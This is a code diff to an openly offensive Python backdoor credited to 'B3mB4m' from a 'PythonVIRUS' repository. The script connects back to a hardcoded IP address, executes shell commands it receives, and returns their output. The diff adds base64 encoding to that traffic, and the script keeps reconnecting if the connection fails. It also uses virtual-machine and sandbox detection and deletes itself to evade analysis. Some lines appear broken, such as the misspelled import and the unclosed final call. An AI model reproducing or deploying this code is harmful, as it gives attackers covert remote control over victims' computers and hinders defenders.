@@ -1,9 +1,16 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
+﻿[~] Concat : b3mb4m@protonmail.com
+[~] Greetz : Bomberman,T-rex,Pixi
+
 
 #https://github.com/b3mb4m/PythonVIRUS/blob/master/FinishedScripts/antidebug.py
-import antidebug
+from protect import antidebug
+from VMsensor import TestVM
+from antisandbox import antisandbox
 
+"""
+Coded by B3mB4m
+b3mb4m@tuta.io
+"""
 
 import os
 import ftplib 
@@ -17,12 +24,11 @@ import socket
 import datatime
 import time
 import sys
+import base64
 
-from VMsensor import TestVM
-from antisandbox import antisandbox
-#Coded by B3mB4m
-#b3mb4m@tuta.io
-	
+
+
+
 class BackDoor(object):
 	def __init__(self):
 		self.HOST = "192.168.2.1" #Statıc IP
@@ -44,16 +50,16 @@ class BackDoor(object):
 		try:
 			while True:
 				self.s.send('>>>  ')
-				data = self.s.recv(1024)
+				data = base64.b64decode(self.s.recv(1024))
 				proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
 				stdin=subprocess.PIPE)
 				stdout_value = proc.stdout.read() + proc.stderr.read()
-				self.s.send(stdout_value)
-        		 self.s.close()
+				self.s.send(base64.b64encode(stdout_value))
+        	self.s.close()
 		except:
 			while True:
 				try:
-					BackDoor().bc() #Recursive huuha ! :)
+					BackDoor().bc()
 				except:
 					continue	
 	def forceclose(self):
@@ -72,5 +78,4 @@ class BackDoor(object):
 if TestVM().checkVirtualMachine() != True and antisandbox() != True:
 	BackDoor().run() 
 else:
-	os.remove(sys.argv[0]) #much better :)
-	#time.sleep(9999999) 
+	os.remove(sys.argv[0]
